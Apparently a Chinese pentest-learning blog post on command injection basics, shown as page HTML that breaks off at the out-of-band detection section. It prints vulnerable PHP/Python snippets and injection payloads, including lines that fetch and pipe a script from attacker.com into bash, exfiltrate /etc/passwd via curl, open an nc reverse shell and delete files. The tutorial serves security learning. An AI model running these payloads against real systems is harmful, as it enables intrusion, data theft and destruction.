@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言命令注入（Command Injection）是 Web 安全领域最常见的高危漏洞之一。攻击者通过在应用程序的输入点中注入操作系统命令，从而在服务器上执行任意指令。本文将从注入点识别、命令连接符、盲注检测到空格绕过技巧，系统性地梳理命令注入的基础知识。  免责声明： 本文所有内容仅供安全研究与学习参考，请勿用于非法用途。未经授权对目标系统进行测试可能违反法律法规，由此产生的一切后果由行为人自行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令注入基础与绕过空格过滤">
+<meta property="og:url" content="https://congliang.github.io/Command-injection-basics/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言命令注入（Command Injection）是 Web 安全领域最常见的高危漏洞之一。攻击者通过在应用程序的输入点中注入操作系统命令，从而在服务器上执行任意指令。本文将从注入点识别、命令连接符、盲注检测到空格绕过技巧，系统性地梳理命令注入的基础知识。  免责声明： 本文所有内容仅供安全研究与学习参考，请勿用于非法用途。未经授权对目标系统进行测试可能违反法律法规，由此产生的一切后果由行为人自行">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-01-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.843Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Command-injection-basics/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Command-injection-basics/","path":"Command-injection-basics/","title":"命令注入基础与绕过空格过滤"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>命令注入基础与绕过空格过滤 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">一、常见注入点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E7%B1%BB"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 网络诊断类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 文件操作类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="nav-number">3.</span> <span class="nav-text">二、命令连接符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%9F%BA%E6%9C%AC%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 基本连接符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E5%AE%9E%E6%88%98%E5%AF%B9%E6%AF%94"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 实战对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Windows-%E7%8E%AF%E5%A2%83%E5%B7%AE%E5%BC%82"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 Windows 环境差异</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E7%9B%B2%E6%B3%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B"><span class="nav-number">4.</span> <span class="nav-text">三、盲注命令注入检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E6%A3%80%E6%B5%8B"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 时间延迟检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%B8%A6%E5%A4%96%EF%BC%88Out-of-Band%EF%BC%89%E6%A3%80%E6%B5%8B"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 带外（Out-of-Band）检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E5%88%A9%E7%94%A8%E5%86%99%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 利用写文件检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">5.</span> <span class="nav-text">四、空格过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-IFS%EF%BC%88%E5%86%85%E9%83%A8%E5%9F%9F%E5%88%86%E9%9A%94%E7%AC%A6%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 IFS（内部域分隔符）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%88%B6%E8%A1%A8%E7%AC%A6%E4%B8%8E-URL-%E7%BC%96%E7%A0%81"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 制表符与 URL 编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E8%8A%B1%E6%8B%AC%E5%8F%B7%E6%89%A9%E5%B1%95"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 花括号扩展</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6%E6%8A%80%E5%B7%A7"><span class="nav-number">5.4.</span> <span class="nav-text">4.4 重定向符技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">5.5.</span> <span class="nav-text">4.5 其他绕过方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E7%BB%BC%E5%90%88%E7%BB%95%E8%BF%87%E7%A4%BA%E4%BE%8B"><span class="nav-number">6.</span> <span class="nav-text">五、综合绕过示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E7%AE%80%E8%BF%B0"><span class="nav-number">7.</span> <span class="nav-text">六、防御措施简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Command-injection-basics/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="命令注入基础与绕过空格过滤 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          命令注入基础与绕过空格过滤
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-01-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-01-15T08:00:00+08:00">2026-01-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>命令注入（Command Injection）是 Web 安全领域最常见的高危漏洞之一。攻击者通过在应用程序的输入点中注入操作系统命令，从而在服务器上执行任意指令。本文将从注入点识别、命令连接符、盲注检测到空格绕过技巧，系统性地梳理命令注入的基础知识。</p>
+<blockquote>
+<p><strong>免责声明：</strong> 本文所有内容仅供安全研究与学习参考，请勿用于非法用途。未经授权对目标系统进行测试可能违反法律法规，由此产生的一切后果由行为人自行承担。</p>
+</blockquote>
+<h2 id="一、常见注入点"><a href="#一、常见注入点" class="headerlink" title="一、常见注入点"></a>一、常见注入点</h2><p>命令注入通常发生在应用程序调用系统命令并将用户输入作为参数传递时，开发者未对输入进行充分过滤或转义。</p>
+<h3 id="1-1-网络诊断类"><a href="#1-1-网络诊断类" class="headerlink" title="1.1 网络诊断类"></a>1.1 网络诊断类</h3><p>最常见的注入点集中在网络诊断功能，这类功能往往直接调用系统级命令：</p>
+<p><strong>Ping 功能</strong></p>
+<p>许多网站提供在线 Ping 测试，后端代码可能类似于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不安全的写法</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 4 &quot;</span> . <span class="variable">$ip</span>);</span><br></pre></td></tr></table></figure>
+
+<p>当 <code>ip</code> 参数未经过滤直接拼接到命令时，攻击者可以注入额外指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常请求</span></span><br><span class="line">GET /ping.php?ip=127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入尝试</span></span><br><span class="line">GET /ping.php?ip=127.0.0.1;<span class="built_in">id</span></span><br><span class="line">GET /ping.php?ip=127.0.0.1|<span class="built_in">whoami</span></span><br><span class="line">GET /ping.php?ip=127.0.0.1&amp;&amp;<span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>Nslookup</strong></p>
+<p>DNS 查询功能同样存在风险：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 典型危险代码</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">domain = request.GET.get(<span class="string">&#x27;domain&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&quot;nslookup &quot;</span> + domain)</span><br></pre></td></tr></table></figure>
+
+<p>注入示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常：查询域名解析</span></span><br><span class="line">domain=example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入：执行额外命令</span></span><br><span class="line">domain=example.com;<span class="built_in">ls</span> -la</span><br><span class="line">domain=example.com||<span class="built_in">whoami</span></span><br><span class="line">domain=$(curl attacker.com/shell.sh | bash)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Traceroute</strong></p>
+<p>路由追踪功能也常被用作注入点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注入示例</span></span><br><span class="line">target=8.8.8.8;<span class="built_in">id</span></span><br><span class="line">target=8.8.8.8|<span class="built_in">cat</span> /etc/hosts</span><br><span class="line">target=8.8.8.8&amp;&amp;<span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-文件操作类"><a href="#1-2-文件操作类" class="headerlink" title="1.2 文件操作类"></a>1.2 文件操作类</h3><p>文件读取、写入、压缩、解压等功能也是注入高发区：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件压缩功能</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;zip backup.zip &quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件读取</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat /var/www/uploads/&quot;</span> . <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+<p>注入尝试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用文件参数注入</span></span><br><span class="line">filename=report.txt;<span class="built_in">rm</span> -rf /tmp/*</span><br><span class="line">filename=report.txt|curl http://attacker.com/$(<span class="built_in">cat</span> /etc/passwd|<span class="built_in">base64</span>)</span><br><span class="line">filename=a.txt&amp;&amp;nc attacker.com 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>其他常见注入点还包括：邮件发送功能（sendmail）、日志查看、统计脚本、SSH 连接测试等。任何涉及系统调用的功能点都应重点关注。</p>
+<h2 id="二、命令连接符"><a href="#二、命令连接符" class="headerlink" title="二、命令连接符"></a>二、命令连接符</h2><p>理解每个连接符的行为差异，对漏洞利用至关重要。以下是 Linux&#x2F;Unix 环境下常用的命令连接符：</p>
+<h3 id="2-1-基本连接符"><a href="#2-1-基本连接符" class="headerlink" title="2.1 基本连接符"></a>2.1 基本连接符</h3><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>语法</th>
+<th>行为说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td><code>cmd1;cmd2</code></td>
+<td>顺序执行，无论 cmd1 是否成功都执行 cmd2</td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td><code>cmd1|cmd2</code></td>
+<td>管道，将 cmd1 的标准输出作为 cmd2 的标准输入</td>
+</tr>
+<tr>
+<td><code>||</code></td>
+<td><code>cmd1||cmd2</code></td>
+<td>逻辑或，cmd1 失败时才执行 cmd2</td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td><code>cmd1&amp;cmd2</code></td>
+<td>后台执行 cmd1，同时执行 cmd2</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td><code>cmd1&amp;&amp;cmd2</code></td>
+<td>逻辑与，cmd1 成功时才执行 cmd2</td>
+</tr>
+<tr>
+<td><code>`</code></td>
+<td><code>`cmd`</code></td>
+<td>命令替换，执行内部命令并替换为输出结果</td>
+</tr>
+<tr>
+<td><code>$()</code></td>
+<td><code>$(cmd)</code></td>
+<td>命令替换（现代写法，推荐）</td>
+</tr>
+</tbody></table>
+<h3 id="2-2-实战对比"><a href="#2-2-实战对比" class="headerlink" title="2.2 实战对比"></a>2.2 实战对比</h3><p>假设在 Ping 功能中测试不同连接符：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 分号 - 无条件执行</span></span><br><span class="line">127.0.0.1;<span class="built_in">id</span></span><br><span class="line"><span class="comment"># 结果：先执行 ping，再执行 id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 管道 - 将输出传递给后续命令</span></span><br><span class="line">127.0.0.1|<span class="built_in">id</span></span><br><span class="line"><span class="comment"># 结果：ping 输出通过管道传给 id（id 忽略输入，仍正常执行）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 逻辑或 - ping 成功时 id 不执行</span></span><br><span class="line">127.0.0.1||<span class="built_in">id</span></span><br><span class="line"><span class="comment"># 结果：ping 正常返回，id 不执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 逻辑或 - 利用不存在的地址使 ping 失败</span></span><br><span class="line">invalid||<span class="built_in">id</span></span><br><span class="line"><span class="comment"># 结果：ping 失败，触发 id 执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 后台执行</span></span><br><span class="line">127.0.0.1&amp;<span class="built_in">id</span></span><br><span class="line"><span class="comment"># 结果：ping 放入后台，同时执行 id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 逻辑与 - ping 成功才执行</span></span><br><span class="line">127.0.0.1&amp;&amp;<span class="built_in">id</span></span><br><span class="line"><span class="comment"># 结果：ping 成功，接着执行 id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 命令替换 (反引号)</span></span><br><span class="line">`<span class="built_in">id</span>`</span><br><span class="line"><span class="comment"># WAF 可能过滤 $ 但遗漏反引号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 命令替换 (现代语法)</span></span><br><span class="line">$(<span class="built_in">id</span>)</span><br><span class="line"><span class="comment"># 在支持的命令替换场景中直接执行</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Windows-环境差异"><a href="#2-3-Windows-环境差异" class="headerlink" title="2.3 Windows 环境差异"></a>2.3 Windows 环境差异</h3><p>在 Windows 命令提示符（cmd.exe）中：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># &amp; 和 &amp;&amp; 行为与 Linux 类似</span><br><span class="line"><span class="built_in">ping</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; whoami</span><br><span class="line"><span class="built_in">ping</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp;&amp; whoami</span><br><span class="line"></span><br><span class="line"># | 管道也可用</span><br><span class="line"><span class="built_in">ping</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> | whoami</span><br><span class="line"></span><br><span class="line"># 但 ; 在 <span class="built_in">cmd</span>.exe 中无效</span><br></pre></td></tr></table></figure>
+
+<p>PowerShell 环境下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;           <span class="comment"># 分号同样用于分隔语句</span></span><br><span class="line">|           <span class="comment"># 管道</span></span><br><span class="line"><span class="variable">$</span>(cmd)      <span class="comment"># 子表达式</span></span><br><span class="line">&amp; &#123; cmd &#125;   <span class="comment"># 脚本块调用</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、盲注命令注入检测"><a href="#三、盲注命令注入检测" class="headerlink" title="三、盲注命令注入检测"></a>三、盲注命令注入检测</h2><p>当命令执行结果无法直接回显到页面时，需要借助带外信道或时间延迟来确认漏洞。</p>
+<h3 id="3-1-时间延迟检测"><a href="#3-1-时间延迟检测" class="headerlink" title="3.1 时间延迟检测"></a>3.1 时间延迟检测</h3><p>通过注入 sleep 类命令，根据响应时间判断命令是否执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">127.0.0.1;<span class="built_in">sleep</span> 5</span><br><span class="line">127.0.0.1||<span class="built_in">sleep</span> 10</span><br><span class="line">127.0.0.1&amp;&amp;<span class="built_in">sleep</span> 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># ping 延迟（可替代 sleep，兼容更多环境）</span></span><br><span class="line">127.0.0.1;ping -c 5 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">127.0.0.1&amp;ping -n 5 127.0.0.1</span><br><span class="line">127.0.0.1&amp;<span class="built_in">timeout</span> /t 5</span><br></pre></td></tr></table></figure>
+
+<p>检测逻辑：正常请求响应时间为 100ms，注入 <code>sleep 5</code> 后响应延迟明显增加（接近 5000ms），可判定存在注入。</p>
+<h3 id="3-2-带外（Out-of-Band）检测"><a href="#3-2-带外（Out-of-Band）检测" class="headerlink" title="3.2 带外（Out-of-Band）检测"></a>3.2 带外（Out-of-Band）检测</h3><p>利用 DNS、HTTP 等外部信道将执行结果或确认信号传出：</p>
+<p><strong>DNS 外带：</strong></p>
